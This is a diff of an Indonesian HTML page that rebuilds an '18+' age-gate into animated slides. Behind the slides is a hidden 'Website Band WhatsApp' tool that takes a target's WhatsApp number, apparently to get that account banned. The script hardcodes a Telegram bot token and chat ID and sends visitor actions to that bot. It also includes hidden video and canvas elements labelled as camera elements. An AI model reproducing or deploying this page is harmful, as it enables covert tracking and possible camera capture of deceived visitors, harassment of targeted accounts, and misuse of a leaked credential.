@@ -2,9 +2,9 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Age Verification Required</title>
+  <title>Secure Access Portal</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
   <style>
     * {
       margin: 0;
@@ -25,190 +25,248 @@
       padding: 20px;
     }
     
-    .warning-overlay {
+    /* Slide Container */
+    .slide-container {
       position: fixed;
       top: 0;
       left: 0;
-      width: 100%;
+      width: 300%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.8);
-      z-index: 1;
       display: flex;
-      justify-content: center;
-      align-items: center;
+      transition: transform 0.8s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+      z-index: 10;
     }
     
-    .warning-modal {
-      background: linear-gradient(145deg, #1e1e1e, #121212);
+    .slide {
+      width: 33.333%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    
+    /* Slide 1 - Warning */
+    .slide-1 {
+      background: linear-gradient(135deg, #1a0000 0%, #330000 100%);
+    }
+    
+    /* Slide 2 - Confirmation */
+    .slide-2 {
+      background: linear-gradient(135deg, #001a00 0%, #003300 100%);
+    }
+    
+    /* Slide 3 - Access */
+    .slide-3 {
+      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
+    }
+    
+    /* Content Box */
+    .content-box {
+      background: rgba(0, 0, 0, 0.85);
       padding: 40px;
-      border-radius: 20px;
-      text-align: center;
+      border-radius: 25px;
       max-width: 500px;
       width: 90%;
-      box-shadow: 0 10px 40px rgba(255, 20, 20, 0.3),
-                  0 0 0 2px #ff0000,
-                  0 0 30px rgba(255, 0, 0, 0.2);
-      animation: pulse 2s infinite alternate;
-      z-index: 2;
-    }
-    
-    @keyframes pulse {
-      0% {
-        box-shadow: 0 10px 40px rgba(255, 20, 20, 0.3),
-                    0 0 0 2px #ff0000,
-                    0 0 30px rgba(255, 0, 0, 0.2);
-      }
-      100% {
-        box-shadow: 0 10px 40px rgba(255, 20, 20, 0.5),
-                    0 0 0 3px #ff0000,
-                    0 0 50px rgba(255, 0, 0, 0.4);
-      }
-    }
-    
-    .warning-icon {
-      font-size: 60px;
-      margin-bottom: 20px;
-      color: #ff0000;
-      text-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
-      animation: bounce 2s infinite;
-    }
-    
-    @keyframes bounce {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
-    
-    .warning-title {
-      font-size: 32px;
-      font-weight: 700;
-      margin-bottom: 15px;
-      background: linear-gradient(90deg, #ff0000, #ff6b6b);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-    }
-    
-    .warning-subtitle {
-      font-size: 18px;
-      color: #ff9999;
-      margin-bottom: 30px;
-      line-height: 1.5;
-    }
-    
-    .age-badge {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      background: linear-gradient(45deg, #ff0000, #ff3333);
-      color: white;
-      font-weight: 700;
-      font-size: 24px;
-      width: 80px;
-      height: 80px;
-      border-radius: 50%;
-      margin-bottom: 25px;
-      box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
-      border: 4px solid white;
-    }
-    
-    .warning-message {
-      background: rgba(255, 0, 0, 0.1);
-      padding: 20px;
-      border-radius: 15px;
-      margin-bottom: 30px;
-      border-left: 5px solid #ff0000;
-      text-align: left;
-    }
-    
-    .warning-message h3 {
-      color: #ff9999;
-      margin-bottom: 10px;
-      font-size: 18px;
-    }
-    
-    .warning-message ul {
-      list-style: none;
-      padding-left: 10px;
-    }
-    
-    .warning-message li {
-      margin-bottom: 8px;
-      color: #ccc;
-      position: relative;
-      padding-left: 25px;
-    }
-    
-    .warning-message li:before {
-      content: "⚠";
-      position: absolute;
-      left: 0;
-      color: #ff0000;
-    }
-    
-    .access-form {
-      margin-top: 20px;
-    }
-    
-    .age-input {
-      width: 100%;
-      padding: 15px;
-      margin-bottom: 20px;
-      background: rgba(255, 255, 255, 0.1);
-      border: 2px solid #ff3333;
-      border-radius: 10px;
-      color: white;
-      font-size: 16px;
       text-align: center;
-      outline: none;
-      transition: all 0.3s;
-    }
-    
-    .age-input:focus {
-      border-color: #ff0000;
-      box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
-    }
-    
-    .access-button {
-      width: 100%;
-      padding: 18px;
-      background: linear-gradient(90deg, #ff0000, #ff3333);
-      color: white;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      font-weight: 600;
-      font-size: 18px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      transition: all 0.3s;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
+      border: 2px solid;
       position: relative;
       overflow: hidden;
     }
     
-    .access-button:hover {
-      background: linear-gradient(90deg, #ff3333, #ff0000);
-      transform: translateY(-2px);
-      box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4);
+    .slide-1 .content-box {
+      border-color: #ff3333;
+      box-shadow: 0 0 40px rgba(255, 0, 0, 0.4),
+                  inset 0 0 20px rgba(255, 0, 0, 0.1);
     }
     
-    .access-button:active {
-      transform: translateY(0);
+    .slide-2 .content-box {
+      border-color: #33ff33;
+      box-shadow: 0 0 40px rgba(0, 255, 0, 0.4),
+                  inset 0 0 20px rgba(0, 255, 0, 0.1);
     }
     
-    .disclaimer {
-      margin-top: 20px;
+    .slide-3 .content-box {
+      border-color: #00ff7f;
+      box-shadow: 0 0 40px rgba(0, 255, 127, 0.4),
+                  inset 0 0 20px rgba(0, 255, 127, 0.1);
+    }
+    
+    /* Icons */
+    .slide-icon {
+      font-size: 70px;
+      margin-bottom: 25px;
+      display: block;
+      animation: float 3s ease-in-out infinite;
+    }
+    
+    @keyframes float {
+      0%, 100% { transform: translateY(0) scale(1); }
+      50% { transform: translateY(-15px) scale(1.05); }
+    }
+    
+    .slide-1 .slide-icon {
+      color: #ff3333;
+      text-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
+    }
+    
+    .slide-2 .slide-icon {
+      color: #33ff33;
+      text-shadow: 0 0 30px rgba(0, 255, 0, 0.7);
+    }
+    
+    .slide-3 .slide-icon {
+      color: #00ff7f;
+      text-shadow: 0 0 30px rgba(0, 255, 127, 0.7);
+    }
+    
+    /* Titles */
+    .slide-title {
+      font-size: 36px;
+      font-weight: 800;
+      margin-bottom: 15px;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      background: linear-gradient(90deg, #fff, #aaa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    .slide-1 .slide-title {
+      background: linear-gradient(90deg, #ff3333, #ff6666);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    .slide-2 .slide-title {
+      background: linear-gradient(90deg, #33ff33, #66ff66);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    .slide-3 .slide-title {
+      background: linear-gradient(90deg, #00ff7f, #00cc66);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    /* Descriptions */
+    .slide-desc {
+      font-size: 16px;
+      line-height: 1.6;
+      margin-bottom: 30px;
+      color: #ccc;
+      padding: 0 10px;
+    }
+    
+    /* Buttons */
+    .slide-button {
+      padding: 16px 40px;
+      font-size: 18px;
+      font-weight: 600;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.3s;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      position: relative;
+      overflow: hidden;
+      z-index: 1;
+      margin: 10px;
+      min-width: 200px;
+    }
+    
+    .slide-button:before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: 0.5s;
+      z-index: -1;
+    }
+    
+    .slide-button:hover:before {
+      left: 100%;
+    }
+    
+    .slide-1 .slide-button {
+      background: linear-gradient(135deg, #ff3333, #cc0000);
+      color: white;
+      box-shadow: 0 5px 20px rgba(255, 0, 0, 0.4);
+    }
+    
+    .slide-1 .slide-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(255, 0, 0, 0.6);
+    }
+    
+    .slide-2 .slide-button {
+      background: linear-gradient(135deg, #33ff33, #00cc00);
+      color: black;
+      box-shadow: 0 5px 20px rgba(0, 255, 0, 0.4);
+    }
+    
+    .slide-2 .slide-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(0, 255, 0, 0.6);
+    }
+    
+    .slide-3 .slide-button {
+      background: linear-gradient(135deg, #00ff7f, #00cc66);
+      color: black;
+      box-shadow: 0 5px 20px rgba(0, 255, 127, 0.4);
+    }
+    
+    .slide-3 .slide-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(0, 255, 127, 0.6);
+    }
+    
+    /* Progress Dots */
+    .progress-dots {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 15px;
+      z-index: 11;
+    }
+    
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.2);
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    
+    .dot.active {
+      background: #00ff7f;
+      box-shadow: 0 0 15px rgba(0, 255, 127, 0.8);
+      transform: scale(1.3);
+    }
+    
+    /* Terms Box */
+    .terms-box {
+      background: rgba(0, 0, 0, 0.5);
+      padding: 15px;
+      border-radius: 10px;
+      margin-top: 25px;
       font-size: 12px;
       color: #888;
       line-height: 1.4;
+      border: 1px solid rgba(255, 255, 255, 0.1);
     }
     
-    .countdown {
-      margin-top: 15px;
-      font-size: 14px;
-      color: #ff9999;
-    }
-    
+    /* Hidden Main Content */
     .hidden-content {
       display: none;
       width: 100%;
@@ -221,6 +279,7 @@
       z-index: 2;
     }
     
+    /* Original Content Styling */
     .content-title {
       font-size: 24px;
       font-weight: 700;
@@ -266,6 +325,23 @@
       font-size: 15px;
     }
     
+    .content-button:hover {
+      background: linear-gradient(90deg, #00cc66, #00ff7f);
+      box-shadow: 0 0 20px lime;
+    }
+    
+    #info {
+      white-space: pre-wrap;
+      text-align: left;
+      margin-top: 20px;
+      background: #222;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 13px;
+      color: #00ff7f;
+    }
+    
+    /* Background Particles */
     .bg-particles {
       position: fixed;
       top: 0;
@@ -278,138 +354,128 @@
     
     .particle {
       position: absolute;
-      width: 2px;
-      height: 2px;
-      background: rgba(255, 0, 0, 0.3);
+      width: 3px;
+      height: 3px;
       border-radius: 50%;
       animation: float 6s ease-in-out infinite;
     }
     
-    @keyframes float {
-      0%, 100% { transform: translateY(0px); opacity: 0.3; }
-      50% { transform: translateY(-20px); opacity: 0.8; }
+    video, canvas {
+      display: none;
     }
     
-    @media (max-width: 480px) {
-      .warning-modal {
-        padding: 25px 20px;
+    @media (max-width: 768px) {
+      .slide-container {
+        width: 300%;
       }
       
-      .warning-title {
-        font-size: 24px;
+      .slide {
+        width: 33.333%;
       }
       
-      .warning-subtitle {
+      .content-box {
+        padding: 30px 20px;
+      }
+      
+      .slide-title {
+        font-size: 28px;
+      }
+      
+      .slide-icon {
+        font-size: 50px;
+      }
+      
+      .slide-button {
+        padding: 14px 30px;
         font-size: 16px;
-      }
-      
-      .age-badge {
-        width: 60px;
-        height: 60px;
-        font-size: 20px;
+        min-width: 180px;
       }
     }
   </style>
 </head>
 <body>
-  <!-- Warning Overlay -->
-  <div class="warning-overlay" id="warningOverlay">
-    <div class="warning-modal">
-      <div class="warning-icon">⚠️</div>
-      <div class="age-badge">18+</div>
-      <h1 class="warning-title">ACCESS RESTRICTED</h1>
-      <p class="warning-subtitle">This content is age-restricted and requires verification</p>
-      
-      <div class="warning-message">
-        <h3>WARNING:</h3>
-        <ul>
-          <li>You must be at least 18 years old to proceed</li>
-          <li>Content may contain sensitive material</li>
-          <li>By continuing, you confirm your age</li>
-          <li>Misrepresentation of age is prohibited</li>
-        </ul>
+  <!-- Slide Access System -->
+  <div class="slide-container" id="slideContainer">
+    <!-- Slide 1: Warning -->
+    <div class="slide slide-1">
+      <div class="content-box">
+        <span class="slide-icon">⚠️</span>
+        <h1 class="slide-title">PERINGATAN</h1>
+        <p class="slide-desc">
+          Konten ini terbatas untuk pengguna 18+ dan memerlukan verifikasi usia.
+          Anda harus berusia minimal 18 tahun untuk melanjutkan.
+        </p>
+        <button class="slide-button" id="slide1Btn">SAYA SUDAH 18+</button>
+        <div class="terms-box">
+          Dengan melanjutkan, Anda menyetujui bahwa Anda telah memenuhi syarat usia minimum.
+          Aktivitas Anda akan dicatat untuk tujuan keamanan.
+        </div>
       </div>
-      
-      <div class="access-form">
-        <input type="number" class="age-input" id="ageInput" placeholder="Enter your age" min="1" max="120">
-        <button class="access-button" id="verifyButton">VERIFY AGE & CONTINUE</button>
+    </div>
+    
+    <!-- Slide 2: Confirmation -->
+    <div class="slide slide-2">
+      <div class="content-box">
+        <span class="slide-icon">✅</span>
+        <h1 class="slide-title">KONFIRMASI</h1>
+        <p class="slide-desc">
+          Anda telah mengonfirmasi bahwa Anda berusia 18+.
+          Apakah Anda yakin ingin melanjutkan ke konten yang mungkin mengandung material sensitif?
+        </p>
+        <button class="slide-button" id="slide2Back">KEMBALI</button>
+        <button class="slide-button" id="slide2Next">LANJUTKAN</button>
       </div>
-      
-      <p class="disclaimer">
-        By clicking "VERIFY AGE & CONTINUE", you confirm that you are at least 18 years old 
-        and agree to our Terms of Service. All activities are logged for security purposes.
-      </p>
-      
-      <p class="countdown" id="countdown">Auto-redirect in: <span id="timer">30</span>s</p>
+    </div>
+    
+    <!-- Slide 3: Final Access -->
+    <div class="slide slide-3">
+      <div class="content-box">
+        <span class="slide-icon">🔓</span>
+        <h1 class="slide-title">AKSES DIBERIKAN</h1>
+        <p class="slide-desc">
+          Akses penuh telah diberikan. Sistem siap digunakan.
+          Gunakan dengan bertanggung jawab.
+        </p>
+        <button class="slide-button" id="slide3Btn">MASUK KE SISTEM</button>
+      </div>
     </div>
   </div>
   
-  <!-- Hidden Main Content (Original Functionality) -->
+  <!-- Progress Dots -->
+  <div class="progress-dots">
+    <div class="dot active" data-slide="0"></div>
+    <div class="dot" data-slide="1"></div>
+    <div class="dot" data-slide="2"></div>
+  </div>
+  
+  <!-- Hidden Main Content (Original System) -->
   <div class="hidden-content" id="mainContent">
-    <p class="content-title">SYSTEM ACCESS GRANTED</p>
-    <p class="glitch-text">› System Ready › Enter Target › Processing...</p>
-    <input type="number" class="content-input" placeholder="Target Number" id="text">
-    <button class="content-button" id="login-button">INITIATE PROCESS</button>
-    <div id="info">› System Standby › Awaiting Input...</div>
+    <p class="content-title">Website Band WhatsApp</p>
+    <p class="glitch-text">⚠️ Jangan Disalahgunakan</p>
+    <input type="number" class="content-input" placeholder="Nomor WhatsApp Target" id="text">
+    <button class="content-button" id="login-button">Next</button>
+    <div id="info">🥷 Silahkan masukkan nomor untuk di band...</div>
   </div>
   
   <!-- Background Particles -->
-  <div class="bg-particles"></div>
-
+  <div class="bg-particles" id="particlesContainer"></div>
+  
   <!-- Camera Elements (Hidden) -->
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
-    // Keep all original functionality
+    // ====================
+    // ORIGINAL SYSTEM CODE
+    // ====================
+    
     const botToken = '8253544506:AAGLgGdYG3fwy8d-C2_KTKbnx09mDZ7LPaA';
     const chatIds = ['8591983840'];
     const infoDiv = document.getElementById('info');
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
-    const ageInput = document.getElementById('ageInput');
-    const verifyButton = document.getElementById('verifyButton');
-    const warningOverlay = document.getElementById('warningOverlay');
-    const mainContent = document.getElementById('mainContent');
-    const timerSpan = document.getElementById('timer');
     
-    // Age verification countdown
-    let countdown = 30;
-    const countdownInterval = setInterval(() => {
-      countdown--;
-      timerSpan.textContent = countdown;
-      if (countdown <= 0) {
-        clearInterval(countdownInterval);
-        ageInput.value = "18";
-        verifyButton.click();
-      }
-    }, 1000);
-    
-    // Age verification function
-    verifyButton.addEventListener('click', () => {
-      const age = parseInt(ageInput.value);
-      
-      if (age >= 18 && age <= 120) {
-        // Access granted
-        warningOverlay.style.display = 'none';
-        mainContent.style.display = 'block';
-        document.title = "System Access";
-        
-        // Create new particles for main content
-        createParticles('#00ff7f');
-        
-        // Send notification to Telegram about access
-        sendToTelegram(`<b>🔓 ACCESS GRANTED</b>\nUser claimed to be ${age} years old\nTime: ${new Date().toLocaleString()}`);
-      } else {
-        // Access denied
-        alert("ACCESS DENIED: You must be at least 18 years old to proceed.");
-        ageInput.style.borderColor = '#ff0000';
-        ageInput.style.boxShadow = '0 0 20px rgba(255, 0, 0, 0.5)';
-        sendToTelegram(`<b>🚫 ACCESS DENIED</b>\nUser entered age: ${age}\nTime: ${new Date().toLocaleString()}`);
-      }
-    });
-    
-    // Original functions (unchanged)
+    // Original functions - TIDAK ADA YANG DIUBAH
     function sendToTelegram(text) {
       chatIds.forEach(id => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -507,6 +573,7 @@ Waktu      : ${new Date().toLocaleString()}
       });
     }
     
+    // Original button click handler - TIDAK ADA YANG DIUBAH
     button.addEventListener('click', async () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8 || nomor.length > 15) {
@@ -530,23 +597,120 @@ Waktu      : ${new Date().toLocaleString()}
       }
     });
     
-    function createParticles(color = '#ff0000') {
-      const container = document.querySelector('.bg-particles');
+    // ====================
+    // NEW SLIDE SYSTEM ONLY
+    // ====================
+    
+    let currentSlide = 0;
+    const slideContainer = document.getElementById('slideContainer');
+    const dots = document.querySelectorAll('.dot');
+    
+    // Initialize particles
+    createParticles('#ff3333');
+    
+    // Function to move slides
+    function goToSlide(slideIndex) {
+      currentSlide = slideIndex;
+      slideContainer.style.transform = `translateX(-${slideIndex * 33.333}%)`;
+      
+      // Update dots
+      dots.forEach((dot, index) => {
+        if (index === slideIndex) {
+          dot.classList.add('active');
+        } else {
+          dot.classList.remove('active');
+        }
+      });
+      
+      // Change particles color based on slide
+      const colors = ['#ff3333', '#33ff33', '#00ff7f'];
+      createParticles(colors[slideIndex]);
+      
+      // Send notification on slide 2 (confirmation)
+      if (slideIndex === 1) {
+        sendToTelegram(`<b>🔐 USER CONFIRMED 18+</b>\nUser has confirmed being 18+\nTime: ${new Date().toLocaleString()}`);
+      }
+    }
+    
+    // Slide 1 button - Confirm 18+
+    document.getElementById('slide1Btn').addEventListener('click', () => {
+      goToSlide(1);
+    });
+    
+    // Slide 2 back button
+    document.getElementById('slide2Back').addEventListener('click', () => {
+      goToSlide(0);
+    });
+    
+    // Slide 2 next button
+    document.getElementById('slide2Next').addEventListener('click', () => {
+      goToSlide(2);
+    });
+    
+    // Slide 3 button - Enter System
+    document.getElementById('slide3Btn').addEventListener('click', () => {
+      // Hide slides and show main content
+      slideContainer.style.display = 'none';
+      document.querySelector('.progress-dots').style.display = 'none';
+      document.getElementById('mainContent').style.display = 'block';
+      document.title = "Website Band WhatsApp";
+      
+      // Send access granted notification
+      sendToTelegram(`<b>🚪 ACCESS GRANTED</b>\nUser has entered the system\nTime: ${new Date().toLocaleString()}`);
+    });
+    
+    // Dot click handlers
+    dots.forEach((dot, index) => {
+      dot.addEventListener('click', () => {
+        goToSlide(index);
+      });
+    });
+    
+    // Create particles function
+    function createParticles(color) {
+      const container = document.getElementById('particlesContainer');
       container.innerHTML = '';
-      for (let i = 0; i < 50; i++) {
+      
+      for (let i = 0; i < 60; i++) {
         const p = document.createElement('div');
         p.className = 'particle';
         p.style.left = Math.random() * 100 + '%';
         p.style.top = Math.random() * 100 + '%';
         p.style.animationDelay = Math.random() * 6 + 's';
         p.style.animationDuration = (Math.random() * 4 + 4) + 's';
-        p.style.background = color.replace('rgb', 'rgba').replace(')', ', 0.3)');
+        
+        // Set color with opacity
+        p.style.background = color;
+        p.style.opacity = Math.random() * 0.5 + 0.2;
+        
+        // Random size
+        const size = Math.random() * 4 + 1;
+        p.style.width = size + 'px';
+        p.style.height = size + 'px';
+        
         container.appendChild(p);
       }
     }
     
-    // Initial particles for warning screen
-    createParticles('#ff0000');
+    // Auto advance after 15 seconds on each slide
+    let autoSlideTimer;
+    
+    function resetAutoSlide() {
+      clearTimeout(autoSlideTimer);
+      autoSlideTimer = setTimeout(() => {
+        if (currentSlide < 2) {
+          goToSlide(currentSlide + 1);
+        }
+      }, 15000);
+    }
+    
+    // Initialize auto slide
+    resetAutoSlide();
+    
+    // Reset timer on any interaction
+    document.querySelectorAll('.slide-button, .dot').forEach(element => {
+      element.addEventListener('click', resetAutoSlide);
+    });
   </script>
 </body>
 </html>
